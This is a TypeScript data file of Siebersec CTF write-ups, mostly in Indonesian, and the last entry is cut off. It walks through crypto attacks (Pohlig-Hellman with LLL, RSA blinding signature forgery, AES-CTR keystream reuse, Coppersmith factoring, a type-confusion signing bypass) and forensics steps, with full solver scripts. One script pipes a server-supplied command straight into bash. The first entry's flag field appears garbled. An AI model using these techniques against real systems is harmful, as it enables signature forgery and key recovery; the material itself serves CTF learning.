import type { WriteUp } from "../types";

export const siebersecCtfWriteups: WriteUp[] = [
  {
    "id": "siebersecctf-crypto-67",
    "title": "SiebersecCTF - Crypto - 67",
    "ctfName": "Siebersec CTF",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge SiebersecCTF - Crypto - 67",
    "problemDescription": "",
    "tools": [],
    "analysis": "1. **Smooth Order Modulus ($p-1$)**: Komentar `#my p is a smooth criminal` menandakan bahwa $p-1$ memiliki faktor prima yang sangat kecil (*B-smooth*). Hal ini membuat *Discrete Logarithm Problem* (DLP) rentan terhadap algoritma Pohlig-Hellman. Kita bisa mencari nilai logaritma diskret parsial pada *subgroup* kecil tanpa perlu memecahkan seluruh nilai $x \\pmod{p-1}$.\n2. **Low-Density Subset Sum (Knapsack)**: Struktur string eksponen $x$ dikonstruksi per bit dari kunci AES berukuran 128-bit. Setiap bit direpresentasikan oleh blok 200 karakter angka `6` atau `7`. Masalah ini dapat dimodelkan sebagai *Subset Sum Problem* dengan densitas sangat rendah, yang sangat optimal diselesaikan menggunakan reduksi basis *lattice* melalui algoritma LLL (Lenstra–Lenstra–Lovász).",
    "solution": [
      {
        "title": "Exploit Strategy",
        "content": "1. Gunakan SageMath untuk memfaktorkan $p-1$ dan kumpulkan faktor prima kecil di bawah $5 \\times 10^9$.\n2. Hitung logaritma diskret parsial pada *subgroup* tersebut menggunakan algoritma Pohlig-Hellman untuk mendapatkan nilai eksponen parsial $T_{partial}$ terhadap modulus gabungan $M_{partial}$. Target modulus yang dikumpulkan dibuat $> 2^{600}$ untuk menurunkan densitas *Subset Sum* menjadi $\\approx 0.21$.\n3. Susun matriks *lattice* berdasarkan hubungan linear antara bit kunci AES dengan bobot pergeseran angka desimal $10^{200 \\times (127 - i)}$.\n4. Jalankan reduksi LLL pada matriks tersebut untuk mengekstrak vektor bit asli.\n5. Rekonstruksi bit menjadi kunci AES dan lakukan dekripsi ECB untuk mendapatkan flag."
      },
      {
        "title": "Exploit Script",
        "content": "```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import long_to_bytes\nimport sys\n\nsys.set_int_max_str_digits(30000)\n\ng = 2\np = 420730... # Salin dari chall.py\ny = 177939... # Salin dari output\nct = bytes.fromhex('fd4bbb20d0a3f7a1133a60c4c5780bc6e2108857d76194fdac090d5895b2621e70b05c0ec9cf04def73493c58aad362d70b05c0ec9cf04def73493c58aad362d3fb7ea4b1bbd3d19fb24dea3874c9181')\n\np_minus_1 = p - 1\nF_factors = factor(p_minus_1)\n\nrems, mods = [], []\nM_partial = 1\nF_mod = Zmod(p)\ng_mod, y_mod = F_mod(g), F_mod(y)\n\nfor q, e in F_factors:\n    sub_order = q**e\n    if sub_order > 5 * 10**9: continue\n    power = p_minus_1 // sub_order\n    x_q = discrete_log(y_mod**power, g_mod**power, ord=sub_order)\n    rems.append(x_q)\n    mods.append(sub_order)\n    M_partial *= sub_order\n    if M_partial > 2**600: break\n\nT_partial = crt(rems, mods)\nX_base = int(\"6\" * (128 * 200))\nS = (T_partial - X_base) % M_partial\nw = [pow(10, 200 * (127 - i), M_partial) for i in range(128)]\n\nn = 128\nN = 2**512\nM = Matrix(ZZ, n + 2, n + 1)\nfor i in range(n):\n    M[i, i] = 2\n    M[i, n] = 2 * N * w[i]\nM[n, n] = 2 * N * M_partial\nfor i in range(n): M[n+1, i] = -1\nM[n+1, n] = -2 * N * S\n\nL = M.LLL()\nfor row in L:\n    if all(abs(val) == 1 for val in row[:n]) and row[n] == 0:\n        bits = [ (val + 1) // 2 for val in row[:n] ]\n        key_bin = \"\".join(str(b) for b in bits)\n        try:\n            cipher = AES.new(long_to_bytes(int(key_bin, 2)), AES.MODE_ECB)\n            from Crypto.Util.Padding import unpad\n            print(unpad(cipher.decrypt(ct), 16).decode())\n            break\n        except: continue"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.sage):",
        "code": "from Crypto.Cipher import AES\r\nfrom Crypto.Util.number import long_to_bytes\r\nimport sys\r\n\r\n# Konfigurasi batas string digit Python\r\nsys.set_int_max_str_digits(30000)\r\n\r\ng = 2\r\np = 4207307025098317548378728215220096278591651164069131592043890901803190544219229913074333288793062986299352670628719778821885052997741625021840584873393056674570878569750816367100788300660497494643458066137112544757107304879199455294719998315845256514194112159992299503103560870655450594469854540669070325418205654373943834137939937559048482619070903529206121282285784594512085736632776033482718302569524598849066364732731247207163509872173524185405320953738044171261349335987178952526668011790990620345145212536026920340312358340751568933250282699976724446746654853220001665881343949991598765853423074540468229605738348844267929223032917619999202056994587262766466956340111745474650650886799\r\ny = 1779399175477932263489919858481023121352559544749403947188234666776640990382963240232362801916090088819026149969315784341673203138946134506007842911682821041738757980543458823857516356434983678145586443087180983417965233581605687580473834270152722484228468963228871641223987328420530155482770841202574514215452032779604660825088307701877530695270535544090811646979321763841822821893713461334844820235332488738608633079772758392206377984560329503478197157687913530699772607886599692894650104537111112122956145243003489946139159751298981716575102821665921418886635587411272850913938513706878703125541819119251546212309011853225022085315099929314616148861893138545326083206395008715530309920145\r\nct = bytes.fromhex('fd4bbb20d0a3f7a1133a60c4c5780bc6e2108857d76194fdac090d5895b2621e70b05c0ec9cf04def73493c58aad362d70b05c0ec9cf04def73493c58aad362d3fb7ea4b1bbd3d19fb24dea3874c9181')\r\n\r\np_minus_1 = p - 1\r\n\r\nprint(\"[*] Tahap 1: Memfaktorkan p-1...\")\r\nF_factors = factor(p_minus_1)\r\nprint(f\"[+] Selesai memfaktorkan! Ditemukan {len(F_factors)} faktor prima unik.\")\r\n\r\nprint(\"\\n[*] Tahap 2: Partial Pohlig-Hellman...\")\r\nrems = []\r\nmods = []\r\nM_partial = 1\r\n\r\nF_mod = Zmod(p)\r\ng_mod = F_mod(g)\r\ny_mod = F_mod(y)\r\n\r\nfor q, e in F_factors:\r\n    sub_order = q**e\r\n    \r\n    # Batas dilonggarkan ke 5 Miliar\r\n    if sub_order > 5 * 10**9:\r\n        print(f\"[-] Melewati faktor raksasa: {q}^{e}\")\r\n        continue\r\n        \r\n    power = p_minus_1 // sub_order\r\n    g_q = g_mod**power\r\n    y_q = y_mod**power\r\n    \r\n    try:\r\n        x_q = discrete_log(y_q, g_q, ord=sub_order)\r\n        rems.append(x_q)\r\n        mods.append(sub_order)\r\n        M_partial *= sub_order\r\n        print(f\"[+] Subgroup {q}^{e} selesai! M_partial saat ini: {M_partial.nbits()} bits\")\r\n        \r\n        # MENAIKKAN TARGET KE 600 BITS UNTUK LLL YANG SEMPURNA\r\n        if M_partial > 2**600:\r\n            print(f\"\\n[+] Target Partial Modulus tercapai! (M_partial = {M_partial.nbits()} bits)\")\r\n            break\r\n    except Exception as err:\r\n        print(f\"[-] Gagal menghitung DL q={q}: {err}\")\r\n\r\nT_partial = crt(rems, mods)\r\nprint(f\"[+] T_partial sukses ditemukan menggunakan CRT!\")\r\n\r\nprint(\"\\n[*] Tahap 3: Menyiapkan Matriks LLL untuk Subset Sum...\")\r\nX_base = int(\"6\" * (128 * 200))\r\nS = (T_partial - X_base) % M_partial\r\n\r\nw = [pow(10, 200 * (127 - i), M_partial) for i in range(128)]\r\n\r\nn = 128\r\nN = 2**512 # Penalti diperbesar\r\nM = Matrix(ZZ, n + 2, n + 1)\r\n\r\nfor i in range(n):\r\n    M[i, i] = 2\r\n    M[i, n] = 2 * N * w[i]\r\n\r\nM[n, n] = 2 * N * M_partial\r\n\r\nfor i in range(n):\r\n    M[n+1, i] = -1\r\nM[n+1, n] = -2 * N * S\r\n\r\nprint(\"[*] Tahap 4: Menjalankan reduksi LLL (Sangat Cepat)...\")\r\nL = M.LLL()\r\n\r\nprint(\"[*] Tahap 5: Mengekstrak bit AES dan Dekripsi...\")\r\nfound = False\r\nfor row in L:\r\n    if all(abs(val) == 1 for val in row[:n]) and row[n] == 0:\r\n        found = True\r\n        b1 = [ (val + 1) // 2 for val in row[:n] ]\r\n        b2 = [ (-val + 1) // 2 for val in row[:n] ]\r\n        \r\n        for bits in (b1, b2):\r\n            if all(b in (0,1) for b in bits):\r\n                key_bin = \"\".join(str(b) for b in bits)\r\n                if len(key_bin) == 128:\r\n                    try:\r\n                        test_key = int(key_bin, 2)\r\n                        cipher = AES.new(long_to_bytes(test_key), AES.MODE_ECB)\r\n                        pt = cipher.decrypt(ct)\r\n                        \r\n                        if b'sctf{' in pt:\r\n                            print(\"\\n[✔] SUCCESS: KEY BERHASIL DIDAPATKAN!\")\r\n                            try:\r\n                                from Crypto.Util.Padding import unpad\r\n                                flag = unpad(pt, 16).decode()\r\n                            except:\r\n                                flag = pt.decode(errors='ignore').strip()\r\n                                \r\n                            print(f\"[🚀] FLAG: {flag}\\n\")\r\n                            sys.exit(0)\r\n                    except Exception:\r\n                        continue\r\n\r\nif not found:\r\n    print(\"[-] LLL gagal mendapatkan vektor +-1. Seharusnya tidak mungkin terjadi di kepadatan ini.\")\r\nelse:\r\n    print(\"[-] Vektor +-1 ditemukan tapi gagal dekripsi (Mungkin salah format flag).\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "pmod{p-1}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-crypto-gachaaddiction",
    "title": "Gacha Addiction",
    "ctfName": "Siebersec CTF",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup: gacha_addiction (Crypto Challenge - SiebersecCTF)",
    "problemDescription": "Tantangan kriptografi `gacha_addiction` menguji pemahaman kita mengenai sifat dasar struktur matematika RSA, khususnya sifat *multiplicative homomorphic* yang membuka celah terhadap serangan Chosen-Message Attack (RSA Blinding).",
    "tools": [
      "python3",
      "pwntools",
      "pycryptodome"
    ],
    "analysis": "Oracle memperbolehkan kita menandatangani pesan apa pun $M$ menjadi $S \\equiv M^d \\pmod n$, namun melarang menandatangani pesan kupon target secara langsung. Kita bisa memanfaatkan sifat homomorfik RSA tanpa padding (textbook RSA) dengan teknik penyamaran pesan (RSA Blinding):\n\n1. Pilih blinding factor $X = 2$.\n2. Samarkan pesan kupon $M$: $M' \\equiv M \\cdot X^e \\pmod n$.\n3. Mintalah tanda tangan untuk $M'$ ke oracle untuk mendapatkan $S' \\equiv (M')^d \\pmod n$.\n4. Lakukan unblinding: $S \\equiv S' \\cdot X^{-1} \\pmod n$.\n\nSetelah kupon di-redeem, kita mendapatkan kuota gacha yang cukup untuk memicu hard pity pada pull ke-90, membocorkan salah satu faktor prima asli pembangun modulus ($p$). Kita tinggal mencari $q = n/p$ dan mendekripsi flag.",
    "solution": [
      {
        "title": "Alur Eksploitasi",
        "content": "1. **RSA Blinding**: Konversi kupon `Winning5050sFORFREE` menjadi integer $M$. Hitung $M' \\equiv M \\cdot X^e \\pmod n$.\n2. **Tanda Tangan**: Kirim $M'$ ke menu penandatanganan (Opsi 1) untuk mendapatkan signature samaran $S'$.\n3. **Unblinding**: Hitung invers modular $2^{-1} \\pmod n$ dan kalikan dengan $S'$ untuk mendapatkan tanda tangan kupon asli $S$.\n4. **Redeem & Pity**: Kirim $S$ ke menu redeem kupon (Opsi 2) untuk klaim tambahan 50 pulls. Lakukan pull gacha (Opsi 3) sebanyak 91 kali untuk memicu kebocoran nilai $p$.\n5. **Dekripsi**: Cari $q = n/p$, hitung eksponen privat $d$, lalu dekripsi ciphertext untuk mendapatkan flag."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (`solve.py`):",
        "code": "from pwn import *\r\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\r\n\r\n# Konfigurasi koneksi remote ke server target\r\np = remote('chal.sieberr.live', 20000)\r\n\r\n# 1. Parsing Nilai n, e, dan Ciphertext dari Banner Utama\r\np.recvuntil(b'n = ')\r\nn = int(p.recvline().strip())\r\np.recvuntil(b'e = ')\r\ne = int(p.recvline().strip())\r\np.recvuntil(b'ciphertext = ')\r\nciphertext = int(p.recvline().strip())\r\n\r\nlog.info(f\"Mengambil Public Key N: {str(n)[:20]}... (Truncated)\")\r\nlog.info(f\"Mengambil Ciphertext: {str(ciphertext)[:20]}... (Truncated)\")\r\n\r\n# Nilai kupon target\r\ncoupon = b'Winning5050sFORFREE'\r\nM = bytes_to_long(coupon)\r\n\r\n# 2. Proses RSA Blinding (Menyamarkan Pesan Kupon)\r\nX = 2\r\nM_prime = (M * pow(X, e, n)) % n\r\n\r\n# Kirim Opsi 1 untuk menandatangani pesan samaran\r\np.sendlineafter(b'What will your choice be(1/2/3/4): ', b'1')\r\np.sendlineafter(b'Please input the message to sign: ', str(M_prime).encode())\r\np.recvuntil(b'your signed message is: ')\r\nS_prime = int(p.recvline().strip())\r\n\r\n# Proses Unblinding (Mendapatkan Tanda Tangan Kupon Asli)\r\nX_inv = pow(X, -1, n)\r\nS = (S_prime * X_inv) % n\r\n\r\n# 3. Klaim Kupon Tambahan (Opsi 2)\r\np.sendlineafter(b'What will your choice be(1/2/3/4): ', b'2')\r\np.sendlineafter(b'please input your signed message: ', str(S).encode())\r\nlog.success(\"Kupon berhasil diklaim! Total Pulls menjadi 100.\")\r\n\r\n# 4. Melakukan Gacha untuk Mencapai Hard Pity (91 Kali Eksekusi)\r\nlog.info(\"Sedang melakukan gacha sebanyak 91 kali untuk memicu Hard Pity...\")\r\nfor i in range(91):\r\n    p.sendlineafter(b'What will your choice be(1/2/3/4): ', b'3')\r\n\r\n# Parsing nilai p asli yang keluar saat hard pity tercapai\r\np.recvuntil(b'p = ')\r\np_factor = int(p.recvline().strip())\r\nlog.success(f\"Hard Pity Tercapai! Nilai p didapatkan: {str(p_factor)[:20]}...\")\r\n\r\n# 5. Memfaktorkan RSA & Mendekripsi Flag\r\nq_factor = n // p_factor\r\nphi = (p_factor - 1) * (q_factor - 1)\r\nd = pow(e, -1, phi)\r\n\r\n# Dekripsi ciphertext menjadi byte flag asli\r\nflag_long = pow(ciphertext, d, n)\r\nflag = long_to_bytes(flag_long)\r\n\r\nlog.success(f\"Flag Berhasil Ditemukan: {flag.decode()}\")\r\n\r\np.close()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Tanda tangan digital menggunakan textbook RSA tanpa padding sangat rawan dimanipulasi dengan teknik Chosen-Message Attack (RSA Blinding). Pihak developer wajib mengimplementasikan skema padding yang aman seperti PSS."
  },
  {
    "id": "siebersecctf-crypto-nickandnorahsinfiniteplaylist",
    "title": "Nick and Norah's Infinite Playlist",
    "ctfName": "Siebersec CTF",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Nick and Norah's Infinite Playlist",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkas",
        "content": "`chall.py` memakai AES-CTR dengan `NONCE = b'\\x00' * 8` untuk dua pesan yang berbeda. CTR berubah jadi stream cipher; kalau key dan nonce dipakai ulang, keystream-nya ikut sama. Efeknya:\n\n\n\nJadi AES-nya tidak perlu dibobol. Yang diserang adalah reuse keystream-nya.",
        "code": "c1 = p1 xor ks\nc2 = p2 xor ks\nc1 xor c2 = p1 xor p2"
      },
      {
        "title": "Recon",
        "content": "File challenge cuma punya fungsi encrypt:\n\n\n\nNonce fixed dan cipher dibuat ulang setiap pemanggilan `encrypt()`. Karena `nick_msg` dan `norah_msg` dienkripsi dengan nonce yang sama, dua ciphertext di `output.txt` punya stream yang sama.",
        "code": "cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)\nreturn cipher.encrypt(msg)"
      },
      {
        "title": "Attack",
        "content": "Hitung XOR dua ciphertext:\n\n\n\nCrib awal gampang dicek dari konteks prompt:\n\n\n\nDari situ crib-dragging lanjut ke pesan Nick. Bagian yang kebuka konsisten:\n\n\n\nXOR crib itu dengan `c1 xor c2`, hasil plaintext Norah kebuka penuh pada overlap:",
        "code": "x = c1 xor c2 = p1 xor p2"
      },
      {
        "title": "Solver",
        "content": "Output:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nimport glob\r\nimport re\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\ndef bxor(a: bytes, b: bytes) -> bytes:\r\n    return bytes(x ^ y for x, y in zip(a, b))\r\n\r\n\r\ndef load_output(path: str | None = None) -> tuple[bytes, bytes, Path]:\r\n    candidates = []\r\n    if path:\r\n        candidates.append(Path(path))\r\n    candidates += [Path(\"output.txt\"), Path(\"output(2).txt\")]\r\n    candidates += [Path(p) for p in sorted(glob.glob(\"output*.txt\"))]\r\n\r\n    seen = set()\r\n    for p in candidates:\r\n        if p in seen:\r\n            continue\r\n        seen.add(p)\r\n        if not p.exists():\r\n            continue\r\n        data = p.read_text(errors=\"ignore\")\r\n        hits = re.findall(r\"c[12]:\\s*([0-9a-fA-F]+)\", data)\r\n        if len(hits) >= 2:\r\n            return bytes.fromhex(hits[0]), bytes.fromhex(hits[1]), p\r\n\r\n    raise SystemExit(\"could not find output file containing c1/c2\")\r\n\r\n\r\ndef main() -> None:\r\n    c1, c2, path = load_output(sys.argv[1] if len(sys.argv) > 1 else None)\r\n\r\n    # AES-CTR was initialized with the same key+nonce for both messages.\r\n    # That reuses the exact same keystream, so c1 ^ c2 = p1 ^ p2.\r\n    x = bxor(c1, c2)\r\n\r\n    # Crib-dragged Nick message. The first bytes confirm the speakers:\r\n    #   x ^ b\"nick: \" -> b\"norah:\"\r\n    # Continuing the English crib reveals Norah's whole overlapping message.\r\n    nick_crib = (\r\n        b\"nick: yo norah, been listening to 'pink moon' by nick drake \"\r\n        b\"nonstop. birds is incr\"\r\n    )\r\n\r\n    norah = bxor(x, nick_crib)\r\n    m = re.search(rb\"sctf\\{[^}]+\\}\", norah)\r\n    if not m:\r\n        raise SystemExit(\"flag not recovered; crib did not expose an sctf{...} token\")\r\n\r\n    flag = m.group(0).decode()\r\n    print(f\"[+] parsed ciphertexts from {path}\")\r\n    print(f\"[+] c1 length: {len(c1)} bytes\")\r\n    print(f\"[+] c2 length: {len(c2)} bytes\")\r\n    print(\"[+] recovered Norah plaintext overlap:\")\r\n    print(norah.decode())\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{this_movie_is_goated}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-crypto-projectj",
    "title": "Project J",
    "ctfName": "Siebersec CTF",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge Project J",
    "problemDescription": "",
    "tools": [],
    "analysis": "The challenge implements RSA encryption where one of the primes, $p$, is a **Proth prime**.\nA Proth prime has the form $p = k \\cdot 2^n + 1$. In this case, the code uses $n = 512 - 64 = 448$.\nSo, $p = k \\cdot 2^{448} + 1$, where $k$ is a 64-bit odd integer.\n\nSince $n = p \\cdot q$:\n$n = (k \\cdot 2^{448} + 1) \\cdot q$\n$n = k \\cdot q \\cdot 2^{448} + q$\n$n \\equiv q \\pmod{2^{448}}$\n\nThis means we know the lower 448 bits of the prime factor $q$. For a 1024-bit modulus $n$ where $q \\approx \\sqrt{n} \\approx 2^{512}$, knowing 448 bits is more than enough to factor $n$ using **Coppersmith's Attack**.",
    "solution": [
      {
        "title": "Exploitation",
        "content": "We define a polynomial $f(x) = x \\cdot 2^{448} + (n \\pmod{2^{448}})$ in the ring $\\mathbb{Z}_n$.\nWe are looking for a small root $x_0 = q_{high}$ such that $f(x_0) = q$, which is a factor of $n$.\nAccording to Coppersmith's theorem, we can find such a root if it is smaller than $n^{1/4}$.\nHere $x_0 \\approx 2^{512-448} = 2^{64}$, and $n^{1/4} \\approx 2^{256}$, so the attack is guaranteed to work.\n\nUsing SageMath's `small_roots` method, we can efficiently find $q_{high}$, reconstruct $q$, factor $n$, and decrypt the flag."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env sage\r\nfrom Crypto.Util.number import long_to_bytes\r\n\r\nc = 28361548396052470805609182453578811296488064111927275091465746476913023481206572454093064113389207519785161200961426105580316368625269715000880847694207735018858472578327415301675140848904695196197416945226625424889008830734957626121902545076351519606299300324512446125784810089682943237280874040201510272479\r\nn = 34324010910101370405032828342262192285560653918790417913883664249459443563214253251280358509933785641445643754340765454837039485364522507628461319355281493786665758401920085329566342675578405334501254462249097312016832870306009221660768717370605131175122327715605174245203892512121128761348915583787535614609\r\n\r\n# q = q_high * 2^448 + (n % 2^448)\r\n# We know q_high is roughly 64 bits (512 - 448)\r\n\r\nnbits = 448\r\nr = n % (2^nbits)\r\n\r\n# f = x * 2^nbits + r\r\n# We need it monic: f = x + r * inverse(2^nbits, n)\r\ninv_2_nbits = inverse_mod(2^nbits, n)\r\nP.<x> = PolynomialRing(Zmod(n))\r\nf = x + r * inv_2_nbits\r\n\r\n# Howland's algorithm or Coppersmith's for finding a factor\r\n# small_roots(X, beta) finds x0 such that f(x0) | n and f(x0) >= n^beta\r\n# Here q approx sqrt(n), so beta = 0.5\r\n# X is the bound for x, which is 2^(512-448) = 2^64\r\n\r\nbeta = 0.45 # q is around n^0.5, so 0.45 is safe\r\nX = 2^(512 - nbits + 1)\r\n\r\nroots = f.small_roots(X=X, beta=beta)\r\n\r\nif roots:\r\n    q_high = roots[0]\r\n    q = int(q_high * 2^nbits + r)\r\n    assert n % q == 0\r\n    p = n // q\r\n    phi = (p - 1) * (q - 1)\r\n    e = 65537\r\n    d = pow(e, -1, phi)\r\n    m = pow(c, d, n)\r\n    print(long_to_bytes(int(m)).decode())\r\nelse:\r\n    print(\"No roots found\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{PR0THess1on4l_pr1m3_leak3r}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-crypto-thinkingspaceii",
    "title": "Thinking Space II",
    "ctfName": "Siebersec CTF",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup: Thinking Space II (Crypto Challenge - SiebersecCTF)",
    "problemDescription": "Tantangan kriptografi Thinking Space II adalah sebuah jebakan (red herring) klasik. Meskipun diberikan file `uov.py` yang berisi implementasi skema kriptografi Unbalanced Oil and Vinegar (UOV) pasca-kuantum sepanjang ratusan baris, kerentanan sebenarnya tidak ada hubungannya dengan kelemahan matematis algoritma tersebut. Celahnya murni berada pada penanganan tipe data di Python 3.",
    "tools": [
      "Python 3",
      "pwntools"
    ],
    "analysis": "Mari kita bedah file eksekusi utama `chall.py`:\n\n```python\nthought = b'I am thinking of the flag'\nprint(pk.hex())\n\nmsg = input('msg: ')\nassert msg != thought\nprint(uov.sign(msg.encode(),sk,pk).hex())\n```\n\nTerdapat dua mekanisme krusial di sini:\n\n1. Variabel `thought` dideklarasikan secara eksplisit sebagai tipe data `bytes` (ditandai dengan prefiks `b''`).\n2. Program meminta input dari pengguna menggunakan fungsi bawaan `input()`. Di Python 3, fungsi `input()` selalu mengembalikan tipe data string (`str`), terlepas dari apa pun yang kita ketik.\n\nKetika program menjalankan baris `assert msg != thought`, Python membandingkan objek `str` dengan objek `bytes`. Karena kedua tipe data ini berbeda secara fundamental dalam arsitektur Python 3, perbandingan `\"I am thinking of the flag\" != b\"I am thinking of the flag\"` akan selalu dievaluasi sebagai `True`.\n\nBerkat type confusion ini, asersi keamanan berhasil dilewati. Setelah lolos, program menjalankan `msg.encode()` yang mengubah string kita kembali menjadi bytes, yang mana isinya sekarang identik $100\\%$ dengan variabel `thought`. Server pun dengan senang hati membuatkan tanda tangan digital asli untuk kita.",
    "solution": [
      {
        "title": "Alur Eksploitasi",
        "content": "Eksploitasi dapat dilakukan secara sangat sederhana tanpa perlu membongkar algoritma UOV:\n\n1. **Bypass PoW**: Selesaikan Proof of Work standar menggunakan skrip yang disediakan.\n2. **Kumpulkan Public Key**: Simpan Public Key (`pk`) yang dicetak pertama kali oleh server.\n3. **Picu Type Confusion**: Saat server meminta input `msg: `, kita cukup mengetikkan string yang sama persis dengan target:\n`I am thinking of the flag`\nKarena input ini adalah string, ia lolos dari blokade `assert`.\n4. **Tangkap Tanda Tangan**: Server akan merespons dengan mencetak signature dalam format hex untuk pesan kita.\n5. **Verifikasi Flag**: Saat server beralih ke blok kode verifikasi dan meminta `sig: `, kita berikan kembali string hex signature yang baru saja kita dapatkan.\n\nServer memverifikasi tanda tangan tersebut terhadap kunci publik dan pesan `thought`. Karena valid, server membuka dan memberikan isi `flag.txt`."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (`solve.py`):",
        "code": "from pwn import *\r\nimport subprocess\r\n\r\ndef solve():\r\n    p = remote('chal.sieberr.live', 20003)\r\n\r\n    # 1. Bypass Proof of Work (PoW)\r\n    p.recvuntil(b'Run the following command and input the solution below to solve the proof-of-work:\\n')\r\n    cmd = p.recvline().strip().decode()\r\n    log.info(f\"PoW Command: {cmd}\")\r\n    \r\n    log.info(\"Sedang menyelesaikan PoW (membutuhkan beberapa detik)...\")\r\n    # Mengeksekusi command PoW secara langsung lewat bash\r\n    pow_solution = subprocess.check_output(cmd, shell=True, executable='/bin/bash').strip()\r\n    \r\n    p.sendlineafter(b'> ', pow_solution)\r\n    p.recvuntil(b'Press enter to proceed to the challenge')\r\n    p.sendline(b'')\r\n    \r\n    # 2. Ambil Public Key\r\n    pk_hex = p.recvline().strip()\r\n    log.info(\"Public Key UOV diterima.\")\r\n    \r\n    # 3. Bypass Type Mismatch\r\n    # String 'msg' tidak akan pernah dianggap sama dengan Bytes 'thought'\r\n    payload = b'I am thinking of the flag'\r\n    p.sendlineafter(b'msg: ', payload)\r\n    \r\n    # 4. Tangkap Tanda Tangan\r\n    sig_hex = p.recvline().strip()\r\n    log.success(\"Berhasil mengelabui server untuk menandatangani pesan rahasia!\")\r\n    \r\n    # 5. Kirim kembali Tanda Tangan dan Dapatkan Flag\r\n    p.sendlineafter(b'sig: ', sig_hex)\r\n    \r\n    flag = p.recvline().strip()\r\n    log.success(f\"FLAG DITEMUKAN: {flag.decode()}\")\r\n    \r\n    p.close()\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{one_who_thinks_all_the_time_has_nothing_to_think_about_except_thoughts}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-crashed",
    "title": "crashed",
    "ctfName": "Siebersec CTF",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge crashed",
    "problemDescription": "",
    "tools": [],
    "analysis": "The provided file `crashed.E01` is an Expert Witness Format (EWF) forensic image. \n\nFirst, I checked the partition layout and filesystem. Using `fls` from Sleuthkit, I identified that the image contains a standard Linux root filesystem (Ext4).\n\n```bash\nfls crashed.E01\n```",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "- **Title:** crashed\n- **Category:** Forensics\n- **Description:** My friends keep pressing my power button, this time my whole pc shut down while I was doing my practice paper :( Help me recover it please"
      },
      {
        "title": "Exploration",
        "content": "I explored the home directory of the user `johnsieberr` (inode 787). I found a `flag.txt` (inode 1800), but its content was just \"a\", which seemed like a distraction.\n\n\n\nThe challenge description mentioned a \"practice paper\" and a sudden shutdown. In Linux filesystems, orphaned files recovered after a crash are often placed in the `lost+found` directory.",
        "code": "icat crashed.E01 1800"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{p0w3r_0ff}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-foren-guessystego2",
    "title": "guessystego2",
    "ctfName": "Siebersec CTF",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "**Category:** Forensics  \n**Flag:** `sctf{1_l0v3_gu335y_st3g0_2}`",
    "problemDescription": "**Category:** Forensics  \n**Flag:** `sctf{1_l0v3_gu335y_st3g0_2}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkas",
        "content": "File yang dikasih cuma `dist.zip`. Isinya satu PNG RGBA. Gambarnya kelihatan normal, tapi alpha channel-nya tidak sepenuhnya konstan: ada nilai `254` dan `255`. Karena gambar tetap terlihat opaque, bagian paling mencurigakan adalah LSB dari alpha channel."
      },
      {
        "title": "Recon",
        "content": "Output penting:\n\n\n\nPengecekan biasa tidak langsung ngasih flag:",
        "code": "file dist.zip\nunzip -l dist.zip\nunzip -q dist.zip -d guessystego2_work\nfile guessystego2_work/dist.png"
      },
      {
        "title": "Titik aneh",
        "content": "Alpha channel harusnya full `255` kalau gambar benar-benar opaque. Di file ini nilainya cuma `254` dan `255`.\n\n\n\nHasilnya:\n\n\n\nLSB alpha diekstrak:\n\n\n\nKalau divisualkan sebagai gambar asli, bit-bit itu muncul seperti strip panjang di bagian atas. Polanya bukan QR yang sudah berbentuk kotak; bitstream-nya diratakan dulu ke pixel pertama PNG.",
        "code": "from PIL import Image\nimport numpy as np\n\nim = Image.open('dist.png').convert('RGBA')\na = np.array(im)[:, :, 3]\nprint(np.unique(a, return_counts=True))"
      },
      {
        "title": "Ekstraksi QR",
        "content": "Karena deskripsi menyebut QR code, bitstream alpha dicoba di-reshape ke ukuran kotak. Script melakukan brute force ukuran `n x n`, mulai dari ukuran QR kecil sampai batas `sqrt(total_pixel)`.\n\nUkuran yang valid ketemu di `246 x 246`. QR tersebut decode ke:\n\n\n\nFragment URL berisi flag.",
